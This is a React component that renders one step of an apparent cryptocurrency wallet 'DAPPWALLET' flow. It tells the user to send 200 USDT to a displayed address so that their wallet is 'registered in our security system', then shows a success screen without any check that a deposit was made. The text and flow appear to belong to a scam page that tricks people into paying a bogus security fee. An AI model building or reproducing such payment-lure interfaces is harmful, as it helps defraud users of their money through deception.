import React, { useState } from "react";
import SuccessForm from "./SuccessForm";

const FormFive = ({ selectedNetwork }) => {
  const [next, setNext] = useState(false);

  return (
    <>
      {next ? (
        <SuccessForm />
      ) : (
        <div>
          <p className="mb-[1rem] text-center text-[#121212] text-[0.8rem]">
            Kindly send 200 USDT to the wallet address below. ...After
            confirming the deposit, DAPPWALLET will manage the process
            automatically within 1 day, registering your wallet in our security
            system.
          </p>
          <div className="text-center">
            <p>
              Blockchain Network:
              <span> {selectedNetwork.blockchainNetwork}</span>{" "}
            </p>
            <p>WALLET ADDRESS BELOW</p>
            <h2>Copy</h2>
            <p className="text-[0.6rem]">{selectedNetwork.address}</p>
          </div>

          <button onClick={() => setNext((prev) => !prev)}>Next</button>
        </div>
      )}
    </>
  );
};

export default FormFive;
